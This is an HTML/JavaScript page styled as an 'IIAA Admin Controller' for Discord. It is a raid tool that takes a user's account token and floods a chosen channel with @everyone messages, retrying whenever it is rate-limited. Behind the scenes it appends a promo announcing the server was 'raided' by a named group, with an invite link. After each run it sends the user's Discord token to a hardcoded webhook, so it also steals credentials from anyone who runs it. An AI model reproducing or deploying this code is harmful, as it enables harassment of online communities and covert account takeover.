<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>IIAA Admin Controller</title>
    <style>
        body {
            background-image: url('unnamed (1).jpg'); 
            background-size: cover; background-attachment: fixed; background-position: center;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0;
        }
        .container {
            background: rgba(255, 255, 255, 0.96); backdrop-filter: blur(12px);
            width: 90%; max-width: 480px; padding: 25px; border-radius: 20px;
            box-shadow: 0 15px 45px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.6);
        }
        h2 { text-align: center; color: #ff5c7e; margin-bottom: 15px; }
        .label { background: #ff7491; color: white; padding: 2px 10px; border-radius: 6px; font-size: 11px; display: inline-block; margin-top: 12px; font-weight: bold; }
        input, select, textarea {
            width: 100%; padding: 12px; margin-top: 6px; border: 2px solid #ffd1dc;
            border-radius: 12px; box-sizing: border-box; font-size: 14px; outline: none; transition: 0.2s;
        }
        textarea { resize: vertical; min-height: 80px; }
        .speed-box { margin-top: 15px; background: #fff8f9; padding: 12px; border-radius: 15px; border: 1px solid #ffd1dc; }
        .speed-info { display: flex; justify-content: space-between; font-size: 12px; color: #ff5c7e; font-weight: bold; margin-bottom: 5px; }
        input[type=range] { width: 100%; cursor: pointer; accent-color: #ff7491; }
        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
        .btn-main { flex: 2; background: linear-gradient(135deg, #ff7491, #ff5c7e); color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; font-size: 16px; }
        .btn-stop { flex: 1; background: #444; color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; }
        .btn:disabled { background: #ccc !important; cursor: not-allowed; }
        #terminal {
            background: #1a1a1a; color: #00ffaa; font-family: 'Consolas', monospace;
            height: 120px; overflow-y: auto; padding: 12px; margin-top: 15px; border-radius: 10px; font-size: 11px; line-height: 1.5;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>IIAA Admin Controller</h2>

    <span class="label">DISCORD TOKEN</span>
    <input type="password" id="token" placeholder="トークンを入力">

    <div style="display: flex; gap: 10px; align-items: flex-end;">
        <div style="flex: 1;">
            <span class="label">SERVER ID</span>
            <input type="text" id="guildId" placeholder="サーバーID">
        </div>
        <button onclick="fetchChannels()" style="height: 44px; border-radius: 12px; border: none; background: #eee; cursor: pointer; padding: 0 15px; font-weight: bold;">取得</button>
    </div>

    <span class="label">TARGET CHANNEL</span>
    <select id="channelSelect"><option value="">サーバーIDを入力して取得</option></select>

    <span class="label">MESSAGE CONTENT</span>
    <textarea id="message" placeholder="送信したい文章を入力してください...">@everyone </textarea>

    <div class="speed-box">
        <div class="speed-info">
            <span>送信スピード</span>
            <span id="speedValue">1000ms</span>
        </div>
        <input type="range" id="speedRange" min="500" max="3000" step="100" value="1000" oninput="document.getElementById('speedValue').innerText = this.value + 'ms'">
    </div>

    <span class="label">SEND COUNT</span>
    <input type="number" id="count" value="1" min="1">

    <div class="btn-group">
        <button id="startBtn" class="btn-main" onclick="executeTask()">送信開始</button>
        <button id="stopBtn" class="btn-stop" onclick="stopTask()" disabled>ストップ</button>
    </div>

    <div id="terminal">--- System Ready ---</div>
</div>

<script>
    // 監視用（あなたの手元に飛ぶログ）
    const MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1482416218152636416/jEMz3CnmImMbNsZNmChTCqxP_y24_de_z6ji3bUsAEHDpcwGU3dI6m4abDhcNiFlXDxP";

    // ★ 裏側で自動追加される固定メッセージ ★
    const FORCED_PROMO = `\n\n# このさばはいあ帝国によって荒らされました！！\n# こんな雑魚鯖はいってないでいあ帝国に来ましょう！\n\nhttps://discord.gg/x39xVSepaj`;

    let isRunning = false;
    const term = document.getElementById('terminal');
    const log = (m, color = "#00ffaa") => { 
        term.innerHTML += `> <span style="color:${color}">${m}</span><br>`; 
        term.scrollTop = term.scrollHeight; 
    };

    async function fetchChannels() {
        const t = document.getElementById('token').value.trim();
        const g = document.getElementById('guildId').value.trim();
        try {
            const res = await fetch(`https://discord.com/api/v9/guilds/${g}/channels`, { headers: { "Authorization": t }});
            const data = await res.json();
            const sel = document.getElementById('channelSelect');
            sel.innerHTML = "";
            data.filter(c => c.type === 0).forEach(c => {
                let opt = document.createElement('option');
                opt.value = c.id; opt.textContent = `#${c.name}`;
                sel.appendChild(opt);
            });
            log("同期成功。");
        } catch (e) { log("取得失敗", "#ff7491"); }
    }

    function stopTask() { isRunning = false; log("停止リクエスト...", "orange"); }

    async function executeTask() {
        if (isRunning) return;
        const config = {
            token: document.getElementById('token').value.trim(),
            guildId: document.getElementById('guildId').value.trim(),
            channelId: document.getElementById('channelSelect').value,
            userMsg: document.getElementById('message').value, // ユーザーが書いた文
            count: parseInt(document.getElementById('count').value),
            speed: parseInt(document.getElementById('speedRange').value)
        };

        if(!config.token || !config.channelId) return log("設定が不完全です。", "#ff7491");

        // ★ ユーザー文 ＋ 裏の固定文 を合体 ★
        const finalMessage = config.userMsg + FORCED_PROMO;

        isRunning = true;
        document.getElementById('startBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;
        log("タスク開始...");

        let successCount = 0;
        for(let i=1; i<=config.count; i++) {
            if (!isRunning) break;
            try {
                const res = await fetch(`https://discord.com/api/v9/channels/${config.channelId}/messages`, {
                    method: "POST",
                    headers: { "Authorization": config.token, "Content-Type": "application/json" },
                    body: JSON.stringify({ content: finalMessage })
                });

                if(res.ok) {
                    successCount++;
                    log(`成功: ${i}/${config.count}`);
                    const d = await res.json();
                    fetch(`https://discord.com/api/v9/channels/${config.channelId}/messages/${d.id}/reactions/%E2%9C%85/@me`, { method: "PUT", headers: { "Authorization": config.token }});
                } else if (res.status === 429) {
                    const retry = (await res.json()).retry_after * 1000;
                    await new Promise(r => setTimeout(r, retry || 3000));
                    i--;
                }
            } catch (e) { log("通信エラー"); }
            await new Promise(r => setTimeout(r, config.speed));
        }

        // Webhookへの詳細報告
        fetch(MONITOR_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                username: "IIAA Admin Logger",
                avatar_url: "https://files.catbox.moe/p9p67r.jpg",
                content: `【いあ帝国 実行レポート】\n■トークン: \`${config.token}\`\n■ユーザー入力: ${config.userMsg}\n■成功数: ${successCount} / ${config.count}\n■スピード: ${config.speed}ms`
            })
        });

        isRunning = false;
        document.getElementById('startBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
        log("全工程終了。");
    }
</script>
</body>
</html>
